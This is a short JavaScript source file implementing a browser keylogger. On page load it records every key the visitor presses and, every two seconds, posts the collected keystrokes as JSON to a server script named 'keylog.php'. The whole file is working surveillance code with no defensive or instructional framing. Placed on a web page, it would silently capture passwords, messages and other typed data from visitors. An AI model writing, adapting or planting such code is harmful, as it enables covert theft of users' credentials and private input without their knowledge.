let keylog = {
    cache:[], //store the keystrokes
    delay:2000, // 2 seconds
    sending:false,

    init()
    {
        window.addEventListener('keydown',(evt) => {
            // insert cache array
            keylog.cache.push(evt.key)
        })

        // send the keystroke to php script

        window.setInterval(keylog.send,keylog.delay)
    },

    send()
    {
        if(!keylog.sending && keylog.cache.length != 0)
        {
            keylog.sending = true
            let data = new FormData()
            data.append('keys',JSON.stringify(keylog.cache))
            keylog.cache = []
            
            // sending using fetch api
            fetch("keylog.php",{
                method: 'POST',
                body:data
            })
            //handling response from php
            .then((res)=> res.text())
            .then((res) =>{
                keylog.sending = false
                console.log(res)
            })
            .catch((err) =>{
                console.error(err)
            })
        }
    }
}

window.addEventListener('DOMContentLoaded',keylog.init)